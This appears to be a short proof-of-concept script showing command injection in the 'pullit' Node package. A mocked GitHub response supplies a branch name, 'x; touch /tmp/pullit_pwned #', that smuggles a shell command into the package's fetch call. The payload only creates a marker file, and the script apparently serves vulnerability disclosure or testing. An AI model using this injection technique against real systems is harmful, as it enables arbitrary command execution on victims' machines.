'use strict';

const Pullit = require('pullit');

const p = Object.create(Pullit.prototype);
p.owner = 'some-owner';
p.repo  = 'some-repo';
p.github = {
  pullRequests: {
    get: function () {
      return Promise.resolve({
        data: {
          head: {
            ref: 'x; touch /tmp/pullit_pwned #'
          }
        }
      });
    }
  }
};

try {
  p.fetch(1);
} catch (e) {}
